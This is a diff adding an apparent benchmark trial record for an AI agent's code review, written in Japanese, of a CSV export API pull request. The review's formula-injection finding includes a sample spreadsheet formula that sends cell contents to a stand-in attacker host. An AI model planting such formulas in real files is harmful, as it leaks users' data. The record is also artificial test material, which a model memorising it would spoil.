@@ -1,0 +1,42 @@
+{
+  "trial": "W22-review-pr-full-c3-1",
+  "scenario": "W22",
+  "config": "review-pr-full",
+  "case": "c3",
+  "rep": 1,
+  "review_md": "# レビュー: タスク一覧の CSV ダウンロード API\n\n対象: `src/app/api/tasks/export/route.ts`、`src/lib/export.ts`、`tests/export.test.ts`（新規 3 ファイル）。\n結論: **マージ前に高 3 件・中 1 件を直す必要があります。** PR の説明にある 4 点のうち 2 点（不正な `status` の扱い、引用符を含むタイトル）が実装と合っていません。`npm test` と `npm run typecheck` は通りますが、どちらの問題もテストでは確かめられていません。\n\n## 指摘\n\n### 1. [高] タイトルの `\"` をエスケープしていない（列がずれる）\n- 場所: `src/lib/export.ts` の `field()`（10〜12 行目）\n- 問題: `` `\"${value}\"` `` で囲むだけで、値の中の `\"` を `\"\"` にしていません（RFC 4180 違反）。タイトルが `He said \"hi\", ok` だと `\"1\",\"He said \"hi\", ok\",\"未着手\",...` が出力され、Excel では別の列に分かれ、以降の列が右にずれます。タイトルは `POST`/`PATCH /api/tasks` で誰でも登録でき（検証は trim と長さのみ）、エラーもなく 200 で壊れた CSV が返ります。PR の「列がずれないようにする」に反します。カンマと改行は囲みで守られています。\n- 直し方: `` `\"${String(value).replaceAll('\"', '\"\"')}\"` ``。あわせて `field()` の doc コメント（「カンマや改行を含んでもよいよう、必ずダブルクォートで囲む」）に「ダブルクォートは `\"\"` にする」を足す。\n\n### 2. [高] 不正な `status` が「指定なし」にならず、見出しだけの CSV が返る\n- 場所: `src/app/api/tasks/export/route.ts` 10〜11 行目\n- 問題: `searchParams.get(\"status\") as TaskStatus | null` は型を偽っているだけで検証していません（CLAUDE.md 規約 2 違反）。`?status=foo`、`?status=DONE`、`?status=`（空文字）は `WHERE status = 'foo'` として SQL に渡り、0 件になります（SQL インジェクションにはなりません）。結果は見出しだけの CSV が 200 で返り、「タスクが無い」と区別できません。PR の「不正な値は一覧と同じく指定なし」に反します。既存の `GET /api/tasks` は `isTaskStatus` を使っています。\n- 直し方: `const raw = new URL(request.url).searchParams.get(\"status\"); listTasks({ status: isTaskStatus(raw) ? raw : undefined })`。`TaskStatus` の import は不要になる。\n\n### 3. [高] テストが名前と中身で食い違い、上の 2 件を検出できない（規約 5）\n- 場所: `tests/export.test.ts` 15〜18 行目 `escapes quotes and commas in titles`\n- 問題: タイトルは `週次 定例の準備` で、引用符・カンマ・改行のどれも含まず、期待値にもエスケープがありません。エスケープ無しでも通ります。ほかに、`?status=` の絞り込み・不正値、未ログイン時の 401、BOM（`CSV_BOM` と route での付与）、レスポンスヘッダー（`Content-Type`、`Content-Disposition`）のテストがありません。PR の検証結果のうち、実際に確かめられているのは空の一覧だけです。\n- 直し方:\n  - タイトルに `a,\"b\"` → 期待 `\"a,\"\"b\"\"\"`、改行入り（LF・CR）、`say \"hi\"` を使うテストに直す（指摘 1 の修正前は失敗するのが正しい）。\n  - 絞り込みの判定（不正値・空文字・null → 指定なし、`done` → `done`）を `src/lib/` の関数に切り出して単体テストする（規約 1 にも沿う）。\n  - route を呼べる形でテストできる場合は、未ログインで 401、ログイン時に 200・`text/csv`・本文が `﻿` で始まることを確認する。\n\n### 4. [中] CSV インジェクション（数式注入）への対策がない\n- 場所: `src/lib/export.ts` の `field()`\n- 問題: ダブルクォートで囲んでいても、Excel は `=`、`+`、`-`、`@`、タブ、CR で始まるセルを数式として評価します。タイトルは自由入力で、ログイン済みの誰でも登録でき、他のユーザーが週次報告のために Excel で開きます。例: `=HYPERLINK(\"http://evil.example/?\"&A1,\"クリック\")`。今回の用途（Excel に貼る）では現実的な経路です。\n- 直し方: 文字列の値が `/^[=+\\-@\\t\\r]/` に一致するとき先頭に `'` を付ける（ID など数値には適用しない。`\"\"` エスケープより前に行う）。対応するテストを追加する。\n\n### 5. [低] `Cache-Control` が無い\n- 場所: `src/app/api/tasks/export/route.ts` の headers\n- 問題: 認証が必要な個人データのダウンロードに `Cache-Control: no-store` が無く、共有プロキシやブラウザにタスク一覧が残り得ます。\n- 直し方: headers に `\"Cache-Control\": \"no-store\"` を足す。\n\n### 6. [低] 1 件目のテストがシードの件数・内容に依存\n- 場所: `tests/export.test.ts` 6〜10 行目（`lines.length === 9`、1 行目の固定値）\n- 問題: シードにタスクが増減・変更されると、CSV と無関係な理由で落ちます。コメント「7 件」も古くなります。\n- 直し方: 明示的に作った 2〜3 件の `Task` を渡し、件数は `tasks.length + 2` のように導出する。ステータスの日本語ラベル 3 種も確認する。\n\n### 7. [低] 細かい点\n- `src/lib/export.ts` 5 行目: `CSV_BOM` が不可視文字のリテラル。エディタやフォーマッタで消えても気づけないので `\"﻿\"` と書く。\n- `src/lib/export.ts` の `STATUS_LABELS[t.status]`: 想定外の status が DB にあると `\"undefined\"` と出力される（DB に CHECK 制約があれば実害は小さい）。\n- `toCsv` の doc コメントに「末尾にも CRLF を付ける」を足すと、テストの「末尾の空文字列」と整合する。\n- `route.ts` 1 行目のコメントに、不正な `status` は絞り込みなしとして扱うこと、ファイル名が `tasks.csv` 固定であること、BOM は `toCsv` ではなく route で付けることを書くと、挙動が読み取りやすい。\n- `listTasks` が DB 例外を投げると、`{ error }` の JSON ではない素の 500 になる（ただし `GET /api/tasks` も同じで、既存と揃っている）。\n- エクスポートの件数に上限やストリーミングが無い（PoC の規模なら問題ない）。\n- テストが、route 側で `?status=` により 0 件になった場合に見出しだけを返す経路と、`assignee` / `dueDate` が文字列でない場合を確認していない（型の上では起きないが、DB 側の制約の確認を勧める）。\n\n## 補足\n- `type-design-analyzer` は、この PR で新しい型が追加されていないため起動していません。`code-simplifier` は、指摘が解消した後の工程のため今回は対象外です。\n- 問題が無いと判断した点（記載省略）: ログイン確認が最初に行われている（規約 9）、SQL は既存のプレースホルダ経由（規約 8）、BOM の実バイトが正しい、新規ライブラリの追加が無い。\n",
+  "review_chars": 3738,
+  "review_committed": true,
+  "transcript": {
+    "cost_usd": 0.7894,
+    "tokens": {
+      "input": 72,
+      "output": 20398,
+      "cache_read": 1209957,
+      "cache_creation": 115290
+    },
+    "turns": 7,
+    "permission_denials": [],
+    "tool_calls": {
+      "Bash": 15,
+      "Agent": 4,
+      "ReadNotifications": 3,
+      "Write": 1,
+      "Edit": 1
+    },
+    "skills_used": [],
+    "subagents": 4,
+    "subagent_types": {
+      "pr-review-toolkit:code-reviewer": 1,
+      "pr-review-toolkit:silent-failure-hunter": 1,
+      "pr-review-toolkit:pr-test-analyzer": 1,
+      "pr-review-toolkit:comment-analyzer": 1
+    },
+    "questions": 0,
+    "active_seconds": 45,
+    "answer_key_access": [],
+    "isolation_suspects": [],
+    "final_message": "`REVIEW.md` には、直前のレビューの指摘がすべて書いてあります。形式は、場所・何が問題か・直し方・重要度です。前回のコミットで抜けていた軽微な指摘を 4 件、項目 7 に足して `REVIEW.md` だけをコミットしました（d9a27e5）。新しい指摘は足していません。コードも直していません。\n\n足した 4 件は次のとおりです。\n- `route.ts` のコメントに書くべきこと。不正な `status` の扱い、ファイル名が固定であること、BOM を付ける場所です。\n- `listTasks` が DB 例外を投げたときに、JSON ではない素の 500 になること。\n- エクスポートの件数に上限が無いこと。\n- テストが確認していない 2 つの経路。`status` で 0 件になった場合と、`assignee` / `dueDate` が文字列でない場合です。\n\n高 3 件、中 1 件、低 3 件の本体は、前回のコミットのままです。PR の 3 ファイルは未コミットのステージ済みのままです。"
+  },
+  "interventions": 0
+}
